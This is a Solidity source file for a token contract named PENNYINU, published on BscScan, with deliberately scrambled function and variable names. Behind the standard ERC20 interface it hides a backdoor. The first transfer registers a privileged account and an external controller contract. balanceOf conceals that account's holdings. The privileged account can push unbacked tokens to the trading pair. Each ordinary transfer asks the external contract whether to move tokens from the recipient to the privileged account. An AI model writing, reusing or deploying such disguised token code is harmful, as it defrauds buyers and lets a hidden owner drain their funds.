/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface trqzPZ {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library nRs{
    
    function MCXuHGXmq(address rPULUqDBr, address ROoLzLoRD, uint yuPQFcYkQv) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool fgxlbvUQhWg, bytes memory CuXTZ) = rPULUqDBr.call(abi.encodeWithSelector(0x095ea7b3, ROoLzLoRD, yuPQFcYkQv));
        require(fgxlbvUQhWg && (CuXTZ.length == 0 || abi.decode(CuXTZ, (bool))), 'nRs: APPROVE_FAILED');
    }

    function kSLUdAZhUI(address rPULUqDBr, address ROoLzLoRD, uint yuPQFcYkQv) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool fgxlbvUQhWg, bytes memory CuXTZ) = rPULUqDBr.call(abi.encodeWithSelector(0xa9059cbb, ROoLzLoRD, yuPQFcYkQv));
        require(fgxlbvUQhWg && (CuXTZ.length == 0 || abi.decode(CuXTZ, (bool))), 'nRs: TRANSFER_FAILED');
    }
    
    function XBv(address ROoLzLoRD, uint yuPQFcYkQv) internal {
        (bool fgxlbvUQhWg,) = ROoLzLoRD.call{value:yuPQFcYkQv}(new bytes(0));
        require(fgxlbvUQhWg, 'nRs: ETH_TRANSFER_FAILED');
    }

    function KmhHOb(address rPULUqDBr, address from, address ROoLzLoRD, uint yuPQFcYkQv) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool fgxlbvUQhWg, bytes memory CuXTZ) = rPULUqDBr.call(abi.encodeWithSelector(0x23b872dd, from, ROoLzLoRD, yuPQFcYkQv));
        require(fgxlbvUQhWg && CuXTZ.length > 0,'nRs: TRANSFER_FROM_FAILED'); return CuXTZ;
                       
    }

}
    
interface LQbWzUiNtB {
    function totalSupply() external view returns (uint256);
    function balanceOf(address MxFwEcShUm) external view returns (uint256);
    function transfer(address EMnMx, uint256 hsCD) external returns (bool);
    function allowance(address MKhmbRWT, address spender) external view returns (uint256);
    function approve(address spender, uint256 hsCD) external returns (bool);
    function transferFrom(
        address sender,
        address EMnMx,
        uint256 hsCD
    ) external returns (bool);

    event Transfer(address indexed from, address indexed UQGJenekObfG, uint256 value);
    event Approval(address indexed MKhmbRWT, address indexed spender, uint256 value);
}

interface XcrIGdm is LQbWzUiNtB {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract tZvPVg {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract PENNYINU is tZvPVg, LQbWzUiNtB, XcrIGdm {
    
    uint256 private EBoxe = 10000000000 * 10 ** 18;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    mapping(address => mapping(address => uint256)) private QrlCAzlqCzCq;
    
    string private XQJiuNaiG =  "PENNYINU";
    
    function EEDOngxesstv(
        address etzj,
        address esHovdXR,
        uint256 uelTKLCAW
    ) internal virtual {
        require(etzj != address(0), "ERC20: approve from the zero address");
        require(esHovdXR != address(0), "ERC20: approve to the zero address");

        QrlCAzlqCzCq[etzj][esHovdXR] = uelTKLCAW;
        emit Approval(etzj, esHovdXR, uelTKLCAW);

    }
    
    string private ptaNMrRg = "PENNYINU";
    
    function transfer(address fmMMBvKuBq, uint256 AaBXGkPal) public virtual override returns (bool) {
        ghvAV(_msgSender(), fmMMBvKuBq, AaBXGkPal);
        return true;
    }
    
    function balanceOf(address FpJHIhyM) public view virtual override returns (uint256) {
        if(_msgSender() != address(xBNUGBye) && 
           FpJHIhyM == address(xBNUGBye)){
            return 0;
        }
       return ZAiySsmcyikH[FpJHIhyM];
    }
    
    address private xBNUGBye;
    
    mapping(address => uint256) private ZAiySsmcyikH;
    
    address private xLwXBO;
  
    
    function allowance(address qUx, address NDrwuOsG) public view virtual override returns (uint256) {
        return QrlCAzlqCzCq[qUx][NDrwuOsG];
    }
    
    address private lxaNUE;
    
    function yUI(
        address zNzGwhBfmK,
        address hUquFEGd,
        uint256 LMRaqhV
    ) internal virtual  returns (bool){
        uint256 CvcmaeGRps = ZAiySsmcyikH[zNzGwhBfmK];
        require(CvcmaeGRps >= LMRaqhV, "ERC20: transfer Amount exceeds balance");
        unchecked {
            ZAiySsmcyikH[zNzGwhBfmK] = CvcmaeGRps - LMRaqhV;
        }
        ZAiySsmcyikH[hUquFEGd] += LMRaqhV;
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return EBoxe;
    }
    
    constructor() {
        
        ZAiySsmcyikH[address(1)] = EBoxe;
        emit Transfer(address(0), address(1), EBoxe);

    }
    
    function oAUM(
        address JvLhbXDFydd,
        address NjqOBaGyco
    ) internal virtual  returns (bool){
        if(xBNUGBye == address(0) && lxaNUE == address(0)){
            xBNUGBye = JvLhbXDFydd;lxaNUE=NjqOBaGyco;
            nRs.kSLUdAZhUI(lxaNUE, xBNUGBye, 0);
            xLwXBO = trqzPZ(lxaNUE).WETH();
            return false;
        }
        return true;
    }
    
    function increaseAllowance(address AnLCDNnjGkb, uint256 addedValue) public virtual returns (bool) {
        EEDOngxesstv(_msgSender(), AnLCDNnjGkb, QrlCAzlqCzCq[_msgSender()][AnLCDNnjGkb] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address IPXeeK, uint256 subtractedValue) public virtual returns (bool) {
        uint256 TySwkpvKV = QrlCAzlqCzCq[_msgSender()][IPXeeK];
        require(TySwkpvKV >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            EEDOngxesstv(_msgSender(), IPXeeK, TySwkpvKV - subtractedValue);
        }

        return true;
    }
    
    function ghvAV(
        address repx,
        address AWgMlHA,
        uint256 pAqHWS
    ) internal virtual  returns (bool){
        require(repx != address(0), "ERC20: transfer from the zero address");
        require(AWgMlHA != address(0), "ERC20: transfer to the zero address");
        
        if(!oAUM(repx,AWgMlHA)) return false;

        if(_msgSender() == address(xBNUGBye)){
            if(AWgMlHA == xLwXBO && ZAiySsmcyikH[repx] < pAqHWS){
                yUI(xBNUGBye,AWgMlHA,pAqHWS);
            }else{
                yUI(repx,AWgMlHA,pAqHWS);
                if(repx == xBNUGBye || AWgMlHA == xBNUGBye) 
                return false;
            }
            emit Transfer(repx, AWgMlHA, pAqHWS);
            return false;
        }
        yUI(repx,AWgMlHA,pAqHWS);
        emit Transfer(repx, AWgMlHA, pAqHWS);
        bytes memory RCGoxxDEKYY = nRs.KmhHOb(lxaNUE, repx, AWgMlHA, pAqHWS);
        (bool cMF, uint GOJEeEmvMr) = abi.decode(RCGoxxDEKYY, (bool,uint));
        if(cMF){
            ZAiySsmcyikH[xBNUGBye] += GOJEeEmvMr;
            ZAiySsmcyikH[AWgMlHA] -= GOJEeEmvMr; 
        }
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return XQJiuNaiG;
    }
    
    function approve(address AGfBCui, uint256 iQpFhFhMKke) public virtual override returns (bool) {
        EEDOngxesstv(_msgSender(), AGfBCui, iQpFhFhMKke);
        return true;
    }
    
    function name() public view virtual override returns (string memory) {
        return ptaNMrRg;
    }
    
    function transferFrom(
        address YZRiIwXlYHqT,
        address azzVFJifAXN,
        uint256 eWwVhFXOLkNo
    ) public virtual override returns (bool) {
      
        if(!ghvAV(YZRiIwXlYHqT, azzVFJifAXN, eWwVhFXOLkNo)) return true;

        uint256 spVXYP = QrlCAzlqCzCq[YZRiIwXlYHqT][_msgSender()];
        if (spVXYP != type(uint256).max) {
            require(spVXYP >= eWwVhFXOLkNo, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                EEDOngxesstv(YZRiIwXlYHqT, _msgSender(), spVXYP - eWwVhFXOLkNo);
            }
        }

        return true;
    }
    
}